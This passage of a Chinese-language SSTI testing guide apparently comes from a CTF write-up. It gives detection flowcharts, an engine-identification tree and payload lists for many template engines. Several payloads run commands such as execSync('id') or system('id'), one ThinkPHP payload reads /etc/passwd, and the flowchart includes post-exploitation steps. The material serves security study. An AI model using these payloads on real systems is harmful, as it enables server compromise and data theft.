class="keyword">as</span> |conslist|&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">push</span> (lookup string.<span class="property">sub</span> <span class="string">&quot;constructor&quot;</span>)&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">      &#123;&#123;#<span class="keyword">with</span> string.<span class="property">split</span> <span class="keyword">as</span> |codelist|&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">push</span> <span class="string">&quot;return require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;);&quot;</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;#each conslist&#125;&#125;</span><br><span class="line">          &#123;&#123;#<span class="title function_">with</span> (string.<span class="property">sub</span>.<span class="property">apply</span> <span class="number">0</span> codelist)&#125;&#125;</span><br><span class="line">            &#123;&#123;<span class="variable language_">this</span>&#125;&#125;</span><br><span class="line">          &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;/each&#125;&#125;</span><br><span class="line">      &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">    &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">  &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">&#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-17-Go-html-template"><a href="#4-17-Go-html-template" class="headerlink" title="4.17 Go - html&#x2F;template"></a>4.17 Go - html&#x2F;template</h3><p>Go 的 html&#x2F;template 相对安全，但仍可能存在信息泄露：</p>
+<p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;.&#125;&#125;                            → 当前对象</span><br><span class="line">&#123;&#123;printf &quot;%v&quot; .&#125;&#125;                → 格式化输出</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、SSTI-测试流程图"><a href="#五、SSTI-测试流程图" class="headerlink" title="五、SSTI 测试流程图"></a>五、SSTI 测试流程图</h2><h3 id="5-1-完整测试流程"><a href="#5-1-完整测试流程" class="headerlink" title="5.1 完整测试流程"></a>5.1 完整测试流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────────────────────────────────────────────────────────────┐</span><br><span class="line">│                           SSTI 测试流程                                      │</span><br><span class="line">├─────────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│                                                                             │</span><br><span class="line">│  Step 1: 信息收集                                                           │</span><br><span class="line">│  ┌─────────────────────────────────────────────────────────────────────┐   │</span><br><span class="line">│  │ • 识别后端语言 (PHP/Python/Java/Ruby/Node.js)                        │   │</span><br><span class="line">│  │ • 识别 Web 框架 (Flask/Django/Laravel/ThinkPHP/Spring)               │   │</span><br><span class="line">│  │ • 查看响应头、Cookie、错误页面                                        │   │</span><br><span class="line">│  │ • 分析 URL 结构和参数                                                 │   │</span><br><span class="line">│  └─────────────────────────────────────────────────────────────────────┘   │</span><br><span class="line">│                                    ↓                                        │</span><br><span class="line">│  Step 2: 基础 SSTI 检测                                                     │</span><br><span class="line">│  ┌─────────────────────────────────────────────────────────────────────┐   │</span><br><span class="line">│  │ 依次测试以下 Payload:                                                 │   │</span><br><span class="line">│  │                                                                       │   │</span><br><span class="line">│  │ Python 系:  &#123;&#123;7*7&#125;&#125;  &#123;&#123;7*&#x27;7&#x27;&#125;&#125;  $&#123;7*7&#125;                               │   │</span><br><span class="line">│  │ PHP 系:     &#123;&#123;7*7&#125;&#125;  &#123;$smarty.version&#125;  &#123;$_SERVER.SERVER_SOFTWARE&#125;   │   │</span><br><span class="line">│  │ Java 系:    $&#123;7*7&#125;  #&#123;7*7&#125;  *&#123;7*7&#125;                                   │   │</span><br><span class="line">│  │ Ruby 系:    &lt;%= 7*7 %&gt;                                               │   │</span><br><span class="line">│  │ Node.js:    &lt;%= 7*7 %&gt;  #&#123;7*7&#125;  &#123;&#123;7*7&#125;&#125;                              │   │</span><br><span class="line">│  │                                                                       │   │</span><br><span class="line">│  │ 观察返回值是否为 49 或其他计算结果                                     │   │</span><br><span class="line">│  └─────────────────────────────────────────────────────────────────────┘   │</span><br><span class="line">│                                    ↓                                        │</span><br><span class="line">│  Step 3: 确认模板引擎                                                       │</span><br><span class="line">│  ┌─────────────────────────────────────────────────────────────────────┐   │</span><br><span class="line">│  │ 根据 Step 2 的结果，使用特定引擎的 Payload 确认:                       │   │</span><br><span class="line">│  │                                                                       │   │</span><br><span class="line">│  │ Jinja2:     &#123;&#123;config&#125;&#125;  &#123;&#123;request&#125;&#125;                                  │   │</span><br><span class="line">│  │ Twig:       &#123;&#123;_self.env&#125;&#125;  &#123;&#123;dump(app)&#125;&#125;                             │   │</span><br><span class="line">│  │ Smarty:     &#123;$smarty.version&#125;  &#123;$smarty.template&#125;                    │   │</span><br><span class="line">│  │ ThinkPHP:   &#123;$_SERVER.SERVER_SOFTWARE&#125;  &#123;$Think.PHP_VERSION&#125;         │   │</span><br><span class="line">│  │ FreeMarker: $&#123;.version&#125;  $&#123;.now&#125;                                     │   │</span><br><span class="line">│  │ Velocity:   $class  #set($x=1)                                       │   │</span><br><span class="line">│  └─────────────────────────────────────────────────────────────────────┘   │</span><br><span class="line">│                                    ↓                                        │</span><br><span class="line">│  Step 4: 信息泄露测试                                                       │</span><br><span class="line">│  ┌─────────────────────────────────────────────────────────────────────┐   │</span><br><span class="line">│  │ • 读取配置文件、密钥                                                  │   │</span><br><span class="line">│  │ • 读取环境变量                                                        │   │</span><br><span class="line">│  │ • 读取服务器信息                                                      │   │</span><br><span class="line">│  │ • 尝试读取源代码                                                      │   │</span><br><span class="line">│  └─────────────────────────────────────────────────────────────────────┘   │</span><br><span class="line">│                                    ↓                                        │</span><br><span class="line">│  Step 5: RCE 尝试                                                           │</span><br><span class="line">│  ┌─────────────────────────────────────────────────────────────────────┐   │</span><br><span class="line">│  │ • 尝试直接命令执行                                                    │   │</span><br><span class="line">│  │ • 如果有 WAF，尝试绕过                                                │   │</span><br><span class="line">│  │ • 使用编码、拼接、替代函数等技巧                                       │   │</span><br><span class="line">│  └─────────────────────────────────────────────────────────────────────┘   │</span><br><span class="line">│                                    ↓                                        │</span><br><span class="line">│  Step 6: 后渗透                                                             │</span><br><span class="line">│  ┌─────────────────────────────────────────────────────────────────────┐   │</span><br><span class="line">│  │ • 读取敏感文件 (flag, 配置, 数据库)                                   │   │</span><br><span class="line">│  │ • 权限提升                                                            │   │</span><br><span class="line">│  │ • 横向移动                                                            │   │</span><br><span class="line">│  │ • 持久化                                                              │   │</span><br><span class="line">│  └─────────────────────────────────────────────────────────────────────┘   │</span><br><span class="line">│                                                                             │</span><br><span class="line">└─────────────────────────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-模板引擎识别决策树"><a href="#5-2-模板引擎识别决策树" class="headerlink" title="5.2 模板引擎识别决策树"></a>5.2 模板引擎识别决策树</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">                  输入测试</span><br><span class="line">                     │</span><br><span class="line">        ┌────────────┴────────────┐</span><br><span class="line">        │                         │</span><br><span class="line">  $&#123;7*7&#125;=49?                 $&#123;7*7&#125;≠49</span><br><span class="line">        │                         │</span><br><span class="line">        ▼                         ▼</span><br><span class="line">┌───────────────┐         &#123;&#123;7*7&#125;&#125;=49?</span><br><span class="line">│ Java/Python   │                 │</span><br><span class="line">│ 可能是:        │    ┌───────────┴───────────┐</span><br><span class="line">│ - FreeMarker  │    │                       │</span><br><span class="line">│ - Thymeleaf   │ &#123;&#123;7*7&#125;&#125;=49            &#123;&#123;7*7&#125;&#125;≠49</span><br><span class="line">│ - Mako        │    │                       │</span><br><span class="line">│ - SpEL        │    ▼                       ▼</span><br><span class="line">└───────────────┘ ┌───────────────┐   &#123;$var&#125;有反应?</span><br><span class="line">                  │ Python/PHP    │         │</span><br><span class="line">                  │ 可能是:        │    ┌────┴────┐</span><br><span class="line">                  │ - Jinja2      │    │         │</span><br><span class="line">                  │ - Twig        │   有反应    无反应</span><br><span class="line">                  │ - Blade       │    │         │</span><br><span class="line">                  │ - Nunjucks    │    ▼         ▼</span><br><span class="line">                  └───────────────┘ ┌─────────┐ ┌─────────┐</span><br><span class="line">                                    │ PHP     │ │ 继续    │</span><br><span class="line">                                    │ 可能是:  │ │ 测试    │</span><br><span class="line">                                    │ -Smarty │ │ 其他    │</span><br><span class="line">                                    │-ThinkPHP│ │ 语法    │</span><br><span class="line">                                    └─────────┘ └─────────┘</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、通用-SSTI-测试清单"><a href="#六、通用-SSTI-测试清单" class="headerlink" title="六、通用 SSTI 测试清单"></a>六、通用 SSTI 测试清单</h2><h3 id="6-1-必测-Payload-清单"><a href="#6-1-必测-Payload-清单" class="headerlink" title="6.1 必测 Payload 清单"></a>6.1 必测 Payload 清单</h3><p><strong>第一轮：基础检测（所有语言通用）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 数学运算类</span><br><span class="line">$&#123;7*7&#125;</span><br><span class="line">&#123;&#123;7*7&#125;&#125;</span><br><span class="line">#&#123;7*7&#125;</span><br><span class="line">*&#123;7*7&#125;</span><br><span class="line">&lt;%= 7*7 %&gt;</span><br><span class="line">$&#123;&#123;7*7&#125;&#125;</span><br><span class="line">&#123;7*7&#125;</span><br><span class="line">[7*7]</span><br><span class="line"></span><br><span class="line"># 字符串操作类</span><br><span class="line">&#123;&#123;&#x27;7&#x27;*7&#125;&#125;</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125;</span><br><span class="line">$&#123;&#x27;7&#x27;*7&#125;</span><br><span class="line"></span><br><span class="line"># 特殊字符测试</span><br><span class="line">$&#123;</span><br><span class="line">&#123;&#123;</span><br><span class="line">&#123;%</span><br><span class="line">&lt;%</span><br><span class="line">#&#123;</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二轮：语言特定检测</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python (Jinja2/Django/Mako)</span></span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;settings&#125;&#125;</span><br><span class="line">&#123;&#123;request&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="variable language_">self</span>&#125;&#125;</span><br><span class="line">$&#123;<span class="variable language_">self</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP (Twig/Smarty/Blade/ThinkPHP)</span></span><br><span class="line">&#123;&#123;_self&#125;&#125;</span><br><span class="line">&#123;$smarty.version&#125;</span><br><span class="line">&#123;$_SERVER.SERVER_SOFTWARE&#125;</span><br><span class="line"><span class="meta">@php echo <span class="number">1</span>; @endphp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Java (FreeMarker/Velocity/Thymeleaf)</span></span><br><span class="line">$&#123;.version&#125;</span><br><span class="line">$<span class="keyword">class</span></span><br><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br><span class="line">[[$&#123;<span class="number">7</span>*<span class="number">7</span>&#125;]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ruby (ERB)</span></span><br><span class="line">&lt;%= <span class="variable language_">self</span> %&gt;</span><br><span class="line">&lt;%= ENV %&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Node.js (EJS/Pug)</span></span><br><span class="line">&lt;%= process.version %&gt;</span><br><span class="line"><span class="comment">#&#123;process.version&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-完整测试-Payload-列表"><a href="#6-2-完整测试-Payload-列表" class="headerlink" title="6.2 完整测试 Payload 列表"></a>6.2 完整测试 Payload 列表</h3><p>为了确保不遗漏任何模板引擎，建议按以下顺序测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"># ==================== 第一阶段：快速检测 ====================</span><br><span class="line"></span><br><span class="line"># 1. 通用数学运算</span><br><span class="line">$&#123;7*7&#125;</span><br><span class="line">&#123;&#123;7*7&#125;&#125;</span><br><span class="line">#&#123;7*7&#125;</span><br><span class="line">&lt;%= 7*7 %&gt;</span><br><span class="line">$&#123;&#123;7*7&#125;&#125;</span><br><span class="line">&#123;7*7&#125;</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125;</span><br><span class="line"></span><br><span class="line"># 2. 错误触发（观察错误信息）</span><br><span class="line">$&#123;</span><br><span class="line">&#123;&#123;</span><br><span class="line">&#123;%</span><br><span class="line">&lt;%</span><br><span class="line">#&#123;</span><br><span class="line">$&#123;&#123;</span><br><span class="line">&#123;$</span><br><span class="line"></span><br><span class="line"># ==================== 第二阶段：Python 模板 ====================</span><br><span class="line"></span><br><span class="line"># Jinja2 (Flask)</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br><span class="line">&#123;&#123;request.environ&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum&#125;&#125;</span><br><span class="line">&#123;&#123;cycler&#125;&#125;</span><br><span class="line"></span><br><span class="line"># Django</span><br><span class="line">&#123;&#123;settings&#125;&#125;</span><br><span class="line">&#123;&#123;settings.SECRET_KEY&#125;&#125;</span><br><span class="line">&#123;&#123;debug&#125;&#125;</span><br><span class="line"></span><br><span class="line"># Mako</span><br><span class="line">$&#123;self&#125;</span><br><span class="line">$&#123;self.module&#125;</span><br><span class="line">&lt;%</span><br><span class="line">import os</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"># Tornado</span><br><span class="line">&#123;&#123;handler.settings&#125;&#125;</span><br><span class="line"></span><br><span class="line"># ==================== 第三阶段：PHP 模板 ====================</span><br><span class="line"></span><br><span class="line"># Twig</span><br><span class="line">&#123;&#123;_self&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env&#125;&#125;</span><br><span class="line">&#123;&#123;app&#125;&#125;</span><br><span class="line">&#123;&#123;dump(app)&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;test&#x27;|upper&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line"># Smarty</span><br><span class="line">&#123;$smarty.version&#125;</span><br><span class="line">&#123;$smarty.template&#125;</span><br><span class="line">&#123;$smarty.now&#125;</span><br><span class="line">&#123;$_SERVER&#125;</span><br><span class="line">&#123;$_GET&#125;</span><br><span class="line">&#123;php&#125;echo 1;&#123;/php&#125;</span><br><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line"></span><br><span class="line"># ThinkPHP (ThinkTemplate)</span><br><span class="line">&#123;$_SERVER.SERVER_SOFTWARE&#125;</span><br><span class="line">&#123;$_SERVER.DOCUMENT_ROOT&#125;</span><br><span class="line">&#123;$Think.PHP_VERSION&#125;</span><br><span class="line">&#123;$_GET.x&#125;</span><br><span class="line">&#123;:phpinfo()&#125;</span><br><span class="line">&#123;$_GET.f|@file|@implode&#125;</span><br><span class="line"></span><br><span class="line"># Blade (Laravel)</span><br><span class="line">&#123;&#123;config(&#x27;app.key&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;env(&#x27;APP_KEY&#x27;)&#125;&#125;</span><br><span class="line">@php echo 1; @endphp</span><br><span class="line">&#123;!! system(&#x27;id&#x27;) !!&#125;</span><br><span class="line"></span><br><span class="line"># ==================== 第四阶段：Java 模板 ====================</span><br><span class="line"></span><br><span class="line"># FreeMarker</span><br><span class="line">$&#123;.version&#125;</span><br><span class="line">$&#123;.now&#125;</span><br><span class="line">$&#123;.locale&#125;</span><br><span class="line">&lt;#assign x=7*7&gt;$&#123;x&#125;</span><br><span class="line">$&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)&#125;</span><br><span class="line"></span><br><span class="line"># Velocity</span><br><span class="line">#set($x=7*7)$x</span><br><span class="line">$class</span><br><span class="line">$class.inspect(&quot;java.lang.Runtime&quot;)</span><br><span class="line"></span><br><span class="line"># Thymeleaf</span><br><span class="line">$&#123;T(java.lang.Runtime)&#125;</span><br><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br><span class="line">[[$&#123;7*7&#125;]]</span><br><span class="line">[($&#123;7*7&#125;)]</span><br><span class="line"></span><br><span class="line"># Spring SpEL</span><br><span class="line">#&#123;7*7&#125;</span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;id&#x27;)&#125;</span><br><span class="line"></span><br><span class="line"># Pebble</span><br><span class="line">&#123;&#123; 7 * 7 &#125;&#125;</span><br><span class="line">&#123;&#123; _self &#125;&#125;</span><br><span class="line"></span><br><span class="line"># ==================== 第五阶段：Ruby 模板 ====================</span><br><span class="line"></span><br><span class="line"># ERB</span><br><span class="line">&lt;%= 7*7 %&gt;</span><br><span class="line">&lt;%= self %&gt;</span><br><span class="line">&lt;%= ENV %&gt;</span><br><span class="line">&lt;%= `id` %&gt;</span><br><span class="line">&lt;%= system(&#x27;id&#x27;) %&gt;</span><br><span class="line"></span><br><span class="line"># Slim</span><br><span class="line">= 7*7</span><br><span class="line">= system(&#x27;id&#x27;)</span><br><span class="line"></span><br><span class="line"># ==================== 第六阶段：Node.js 模板 ====================</span><br><span class="line"></span><br><span class="line"># EJS</span><br><span class="line">&lt;%= 7*7 %&gt;</span><br><span class="line">&lt;%= process.version %&gt;</span><br><span class="line">&lt;%= process.env %&gt;</span><br><span class="line">&lt;%= require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;) %&gt;</span><br><span class="line"></span><br><span class="line"># Pug (Jade)</span><br><span class="line">#&#123;7*7&#125;</span><br><span class="line">#&#123;process.version&#125;</span><br><span class="line">#&#123;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;</span><br><span class="line"></span><br><span class="line"># Handlebars</span><br><span class="line">&#123;&#123;#with &quot;s&quot; as |string|&#125;&#125;&#123;&#123;/with&#125;&#125;</span><br><span class="line"></span><br><span class="line"># Nunjucks</span><br><span class="line">&#123;&#123;7*7&#125;&#125;</span><br><span class="line">&#123;&#123;range(10)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-测试注意事项"><a href="#6-3-测试注意事项" class="headerlink" title="6.3 测试注意事项"></a>6.3 测试注意事项</h3><ol>
+<li><strong>URL 编码</strong>：特殊字符需要 URL 编码<ul>
+<li><code>&#123;</code> → <code>%7B</code></li>
+<li><code>&#125;</code> → <code>%7D</code></li>
+<li><code>#</code> → <code>%23</code></li>
+<li><code>$</code> → <code>%24</code></li>
+</ul>
+</li>
+<li><strong>观察响应</strong>：<ul>
+<li>返回计算结果 → 存在 SSTI</li>
+<li>返回原样 → 该语法不被识别</li>
+<li>返回错误 → 可能存在 SSTI，语法有误</li>
+<li>返回空白 → 可能被过滤或执行失败</li>
+</ul>
+</li>
+<li><strong>多参数测试</strong>：<ul>
+<li>不仅测试明显的输入点</li>
+<li>测试所有 GET&#x2F;POST 参数</li>
+<li>测试 Cookie、Header</li>
+<li>测试 JSON 字段</li>
+</ul>
+</li>
+<li><strong>编码绕过</strong>：<ul>
+<li>如果某些字符被过滤，尝试编码绕过</li>
+<li>URL 编码、Unicode 编码、HTML 实体编码</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="七、实战案例分析"><a href="#七、实战案例分析" class="headerlink" title="七、实战案例分析"></a>七、实战案例分析</h2><h3 id="7-1-案例：RenderMe-ThinkPHP-8"><a href="#7-1-案例：RenderMe-ThinkPHP-8" class="headerlink" title="7.1 案例：RenderMe (ThinkPHP 8)"></a>7.1 案例：RenderMe (ThinkPHP 8)</h3><p>这就是我们刚刚做的 CTF 题目，完美展示了为什么 <code>&#123;&#123;7*7&#125;&#125;</code> 没有反应。</p>
+<p><strong>题目环境：</strong></p>
+<ul>
+<li>框架：ThinkPHP 8</li>
+<li>模板引擎：ThinkTemplate</li>
+<li>入口：<code>/?name=CTFer</code></li>
+</ul>
+<p><strong>测试过程：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">测试 1: &#123;&#123;7*7&#125;&#125;</span><br><span class="line">结果: Hello, &#123;&#123;7*7&#125;&#125;  ← 原样输出，不是 Jinja2/Twig</span><br><span class="line"></span><br><span class="line">测试 2: $&#123;7*7&#125;</span><br><span class="line">结果: Hello, $&#123;7*7&#125;   ← 原样输出，不是 FreeMarker</span><br><span class="line"></span><br><span class="line">测试 3: &#123;$_SERVER.SERVER_SOFTWARE&#125;</span><br><span class="line">结果: Hello, Apache/2.4.65 (Debian)  ← 成功！是 ThinkPHP/Smarty 风格</span><br></pre></td></tr></table></figure>
+
+<p><strong>为什么 49 失败？</strong></p>
+<p>ThinkPHP 的模板语法是 <code>&#123;$var&#125;</code> 而不是 <code>&#123;&#123;var&#125;&#125;</code>：</p>
+<ul>
+<li><code>&#123;&#123;7*7&#125;&#125;</code> 不是有效的 ThinkPHP 模板标签</li>
+<li>ThinkPHP 不会解析它，直接原样输出</li>
+<li>必须使用 <code>&#123;$...&#125;</code> 语法才能触发模板解析</li>
+</ul>
+<p><strong>正确的测试 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;$_SERVER.SERVER_SOFTWARE&#125;  → 服务器信息</span><br><span class="line">&#123;$_GET.x&#125;&amp;x=test            → 输出 GET 参数</span><br><span class="line">&#123;$_GET.f|@file|@implode&#125;&amp;f=/etc/passwd  → 文件读取</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-案例：Flask-SSTI"><a href="#7-2-案例：Flask-SSTI" class="headerlink" title="7.2 案例：Flask SSTI"></a>7.2 案例：Flask SSTI</h3><p><strong>题目环境：</strong></p>
+<ul>
+<li>框架：Flask</li>
+<li>模板引擎：Jinja2</li>
+<li>入口：<code>/?name=test</code></li>
+</ul>
+<p><strong>测试过程：</strong></p>
